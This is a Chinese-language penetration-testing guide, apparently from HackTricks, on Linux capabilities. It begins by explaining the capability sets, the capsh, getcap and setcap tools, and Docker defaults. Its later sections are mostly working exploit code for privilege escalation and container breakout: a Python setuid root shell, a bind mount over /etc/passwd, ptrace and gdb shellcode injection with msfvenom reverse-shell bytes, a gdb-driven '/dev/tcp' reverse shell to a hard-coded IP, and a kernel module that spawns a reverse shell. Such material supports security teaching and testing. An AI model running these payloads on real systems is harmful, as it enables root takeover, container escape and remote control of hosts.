# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities 将 **root 权限划分为更小且彼此独立的单元**，允许进程仅拥有部分权限。这样可以避免不必要地授予完整的 root 权限，从而降低风险。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### 问题：

- 普通用户对打开 raw sockets 或绑定 1024 以下 Internet 端口等操作的权限有限；capabilities 可以仅授予所需的操作，而不是完整的 root 权限。<sup>[[14]](#references)</sup>

### Capability Sets：

Linux 会为每个线程公开以下 capability sets，并在进程更改凭据或执行文件时由内核应用相应限制。<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**：

- **用途**：当执行的文件具有匹配的 inheritable file capabilities 时，用于标识可能在 `execve()` 后加入 permitted set 的 capabilities。
- **功能**：线程的 inheritable set 会在 `execve()` 期间保留；它本身不会使这些 capabilities 生效。
- **限制**：向此 set 添加 capability 会受到 permitted set 和 bounding set 的限制。<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**：

- **用途**：表示进程当前实际使用的 capabilities。
- **功能**：这是内核检查并据此授予各种操作权限的 capabilities set。对于文件而言，此 set 可以是一个标志，用于指示是否应将文件的 permitted capabilities 视为 effective。
- **重要性**：effective set 对即时权限检查至关重要，作为进程可以使用的 active capabilities set。

3. **Permitted (CapPrm)**：

- **用途**：定义进程可以拥有的最大 capabilities set。
- **功能**：进程可以将 capability 从 permitted set 提升到 effective set，从而获得使用该 capability 的能力。它也可以从 permitted set 中删除 capabilities。
- **边界**：如果从此 set 中删除某个 capability，通常无法恢复，除非执行授予该 capability 的文件或进行其他特权转换。<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**：

- **用途**：限制进程在 `execve()` 期间从文件中获得的 capabilities，以及可以添加到其 inheritable set 中的 capabilities。
- **功能**：此 set 会在 `fork()` 期间继承，并在 `execve()` 期间保留；当调用者拥有 `CAP_SETPCAP` 时，可以从中删除 capabilities。
- **使用场景**：从此 set 中移除不必要的 capabilities，可以限制之后获取特权的能力。<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**：
- **用途**：允许选定的 capabilities 在对非特权程序执行 `execve()` 后继续保留在 permitted 和 effective set 中。
- **功能**：当执行的文件不是特权文件时，ambient capabilities 会被添加到新的 permitted 和 effective set 中。
- **限制**：只有同时存在于 permitted 和 inheritable set 中时，某个 capability 才能成为 ambient；执行 set-user-ID/set-group-ID 文件或带有 capabilities 的文件会清除 ambient set。<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## 进程与二进制文件 Capabilities

### 进程 Capabilities

要查看特定进程的 capabilities，请使用 /proc 目录中的 **status** 文件。由于该文件提供了更多详细信息，下面仅关注与 Linux capabilities 相关的信息。\
请注意，对于所有正在运行的进程，capability 信息都是按线程维护的，而文件 capabilities 则存储在 `security.capability` 扩展属性中。<sup>[[14]](#references)[[15]](#references)</sup>

你可以在 /usr/include/linux/capability.h 中找到定义的 capabilities。

你可以通过 `cat /proc/self/status` 或 `capsh --print` 查看当前进程的 capabilities，也可以在 `/proc/<pid>/status` 中查看其他进程的 capabilities。<sup>[[15]](#references)[[26]](#references)</sup>
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
在大多数系统上，此命令应返回五行 capability 信息。<sup>[[15]](#references)</sup>

- CapInh = Inherited capabilities
- CapPrm = Permitted capabilities
- CapEff = Effective capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
这些十六进制数字没有意义。使用 `capsh` 工具，我们可以将其解码为 capability 名称。<sup>[[26]](#references)</sup>
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
现在检查 `ping` 使用的 **capabilities**：
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
虽然这种方法可行，但还有另一种更简单的方法。要查看正在运行的进程的 capabilities，请使用 **getpcaps** 工具并在其后指定进程 ID（PID）；它也接受进程 ID 列表。<sup>[[22]](#references)</sup>
```bash
getpcaps 1234
```
让我们在为二进制文件 `tcpdump` 授予 `cap_net_admin` 和 `cap_net_raw` 权限后，检查其抓取网络流量的能力（`tcpdump` 正在进程 9562 中运行）。<sup>[[22]](#references)[[25]](#references)</sup>
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
如你所见，这些 capabilities 与通过两种方式检查进程所得的结果一致。`getpcaps` 工具使用 libcap 查询目标进程的 capabilities，并以文本形式将其打印出来；它接受一个或多个 PID。<sup>[[22]](#references)</sup>

### 二进制文件的 Capabilities

二进制文件可以具有在执行期间应用的文件 capabilities。例如，`ping` 二进制文件可能携带 `cap_net_raw` capability。<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
你可以使用 `getcap -r` 搜索具有 capabilities 的二进制文件。<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### 使用 capsh 丢弃 capabilities

如果我们从当前的 bounding set 中丢弃 `CAP_NET_RAW`，需要该 capability 的程序应不再能够使用它。<sup>[[26]](#references)</sup>
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
除了 _capsh_ 本身的输出外，_tcpdump_ 命令本身也应该引发错误。

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

该错误表明，在从 bounding set 中移除 `CAP_NET_RAW` 后，`tcpdump` 无法使用请求的 file capability 执行。

### 移除 Capabilities

你可以使用 `setcap -r` 移除文件的 capabilities。<sup>[[25]](#references)</sup>
```bash
setcap -r </path/to/binary>
```
## User Capabilities

Linux 不会直接为登录用户分配文件 capabilities，但 `pam_cap` PAM module 可以使用 `/etc/security/capability.conf` 为已认证的会话设置可继承的 capabilities。<sup>[[16]](#references)</sup> 每个条目将以逗号分隔的 capability 名称或编号映射到一个或多个用户名。<sup>[[17]](#references)</sup>
文件示例：
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## 环境能力

编译以下程序后，可以在提供 capabilities 的环境中 **spawn 一个 bash shell**。<sup>[[14]](#references)</sup>
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
在**由编译后的 ambient binary 执行的 bash**中，可以观察到**新的 capabilities**（普通用户在“current”部分不会拥有任何 capability）。<sup>[[14]](#references)</sup>
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> 你**只能添加同时存在于 permitted 集合和 inheritable 集合中的 capabilities**。<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb 二进制文件

Capability-dumb 二进制文件是带有文件 capabilities、但不使用 libcap 管理这些 capabilities 的程序。如果其 file effective 位已设置，kernel 会将文件的 permitted capabilities 启用到进程的 effective 集合中；如果进程未获得所有 permitted capabilities，执行可能会失败。<sup>[[14]](#references)</sup>

## Service Capabilities

以 root 身份运行的系统 service 可能会保留广泛的 capabilities，除非其执行环境对这些 capabilities 进行了限制。在 systemd unit 中，`User=` 用于选择 service 用户，而 `AmbientCapabilities=` 会将指定的 capabilities 添加到所执行进程的 ambient 集合中。<sup>[[18]](#references)</sup>
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker 容器中的 Capabilities

Docker 启动容器时会使用一组默认的 capability，这些 capability 可以通过 `--cap-add` 和 `--cap-drop` 进行更改；可以使用 `amicontained` 检查示例容器。<sup>[[19]](#references)[[24]](#references)</sup>
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## 提权/Container Escape

当你**希望在执行特权操作后限制自己的进程**时，Capabilities 很有用（例如设置 chroot 并绑定到 socket 后）。然而，通过向这些进程传递恶意命令或参数，可以利用它们，而这些命令或参数随后会以 root 身份运行。<sup>[[2]](#references)</sup>

你可以使用 `setcap` 强制为程序设置 file capabilities，并使用 `getcap` 查询它们。<sup>[[23]](#references)[[25]](#references)</sup>
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
对于文件 capability 文本，`+ep` 会将指定的 capability 提升到 effective 和 permitted 集合中；`-` 会降低选定的 flags。<sup>[[21]](#references)</sup>

要识别系统或文件夹中具有 capabilities 的程序，请使用 `getcap -r`。<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Exploitation 示例

在以下示例中，发现二进制文件 `/usr/bin/python2.6` 存在 privesc 漏洞：
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
`tcpdump` **允许任何用户 sniff packets** 所需的 **Capabilities**：
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### “empty” capabilities 的特殊情况

文件可以携带一个空的 capability 集合（`getcap myelf` 返回 `myelf =ep`）。空集合不会授予任何 capability；当它与 root-owned 的 set-user-ID 位结合时，程序仍然可以将执行进程的 effective ID 和 saved ID 更改为 0，而无需获得 file capabilities。一个 unowned、非 SUID/SGID 且带有 `=ep` 的文件不会以 root 身份运行。<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 是一种权限非常强大的 Linux capability，由于其广泛的 **administrative privileges**，通常被认为接近 root 级别，例如挂载设备或操纵 kernel 功能。虽然它对于模拟完整系统的容器不可或缺，但 **`CAP_SYS_ADMIN` 会带来重大的安全挑战**，尤其是在容器化环境中，因为它可能导致 privilege escalation 和 system compromise。因此，应对其使用进行严格的安全评估和谨慎管理，并强烈建议在特定于应用的容器中删除此 capability，以遵循 **principle of least privilege** 并最大限度地减少 attack surface。<sup>[[14]](#references)</sup>

**使用 binary 的示例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
使用 Python，你可以将修改后的 _passwd_ 文件挂载到真实的 _passwd_ 文件之上：
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
最后，将修改后的 `passwd` 文件 **mount** 到 `/etc/passwd`：
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
并且你将能够使用密码“password”以 **`su` as root**。

**带环境的示例（Docker breakout）**

你可以使用以下命令检查 Docker container 中已启用的 capabilities：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在前面的输出中可以看到，SYS_ADMIN capability 已启用。<sup>[[14]](#references)</sup>

- **Mount**

在具备适当的 device 和 namespace 访问权限时，这可以允许 Docker container **挂载 host 磁盘并访问其内容**。<sup>[[14]](#references)</sup>
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **完全访问权限**

在前一种方法中，我们成功访问了主机磁盘。\
如果主机正在运行 **ssh** 服务器，你可以**在已挂载的磁盘中创建一个用户**，然后通过 SSH 访问它。<sup>[[14]](#references)</sup>
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

使用 `CAP_SYS_PTRACE` 时，进程可以跟踪和检查其 PID namespace 中可见的其他进程。若要从 Docker container 中 targeting host processes，请使用 `--pid=host` 共享 host PID namespace（或加入包含目标进程的 namespace）。<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 授予使用 `ptrace(2)` 提供的 debugging 和 system call tracing 功能，以及 `process_vm_readv(2)` 和 `process_vm_writev(2)` 等 cross-memory attach 调用的能力。尽管它对于诊断和 monitoring 非常强大，但如果启用 `CAP_SYS_PTRACE` 时没有对 `ptrace(2)` 施加 seccomp filter 等限制措施，可能会严重削弱系统安全性。具体而言，它可以被利用来绕过其他安全限制，尤其是 seccomp 施加的限制，[如这个 proof of concept (PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53) 所示。<sup>[[10]](#references)</sup>

**使用 binary (python) 的示例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**使用 binary 的示例（gdb）**

具有 `ptrace` capability 的 `gdb`：
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
使用 msfvenom 创建 shellcode，并通过 gdb 注入内存
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
使用 gdb 调试 root 进程，并复制粘贴之前生成的 gdb 命令行：
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**环境示例（Docker breakout）- 另一个 gdb Abuse**

如果已安装 **GDB**（或者例如可以使用 `apk add gdb` 或 `apt install gdb` 进行安装），你可以**从 host 调试一个进程**，并让它调用 `system` 函数。（此技术还需要 capability `SYS_ADMIN`）**。**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
你将无法看到所执行命令的输出，但该命令会由该进程执行（因此获取一个 rev shell）。

> [!WARNING]
> 如果出现错误 "No symbol "system" in current context."，请检查前一个示例，该示例演示了如何通过 gdb 在程序中加载 shellcode。

**Example with environment (Docker breakout) - Shellcode Injection**

你可以使用以下命令检查 Docker 容器内启用的 capabilities：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
列出运行在**主机**中的**进程**：`ps -eaf`

1. 获取**架构**：`uname -m`
2. 为该架构查找一段**shellcode**（[https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128)）
3. 查找一个可将**shellcode** **注入**进程内存的**程序**（[https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c)）
4. 在程序中**修改** **shellcode**，然后进行**编译**：`gcc inject.c -o inject`
5. **注入**并获取你的**shell**：`./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 允许进程**加载和卸载 kernel modules（`init_module(2)`、`finit_module(2)` 和 `delete_module(2)` system calls）**，从而直接访问 kernel 的核心操作。此 capability 会带来严重的 security risks，因为加载 module 可以修改 kernel 的行为，并可能突破 isolation boundaries。<sup>[[6]](#references)[[14]](#references)</sup>
**这允许在对进程可见的 kernel 中插入或移除 modules；在 container 中，是否会影响 host kernel 取决于 isolation configuration**。<sup>[[14]](#references)</sup>

**使用 binary 的示例**

在以下示例中，**`python`** binary 具备此 capability。
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
默认情况下，**`modprobe`** command 会在目录 **`/lib/modules/$(uname -r)`** 中检查 dependency list 和 map files。\
为了利用这一点，我们创建一个伪造的 **lib/modules** 文件夹：
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
然后 **编译下面 2 个示例中的内核模块，并将其复制** 到此文件夹：
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
最后，执行所需的 Python 代码以加载此内核模块：
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**使用 binary 的示例 2**

在以下示例中，binary **`kmod`** 具有此 capability。
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
这意味着可以使用命令 **`insmod`** 插入 kernel module。请参考以下示例，abusing 此权限获取 **reverse shell**。

**使用 environment 的示例（Docker breakout）**

你可以使用以下命令检查 Docker container 内启用的 capabilities：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在之前的输出中可以看到，已启用 **SYS_MODULE** capability。<sup>[[14]](#references)</sup>

**创建**将执行 reverse shell 的 **kernel module**，以及用于**编译**它的 **Makefile**：
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Makefile 中每个 make 单词前的空白字符**必须是制表符，而不是空格**！

执行 `make` 进行编译。
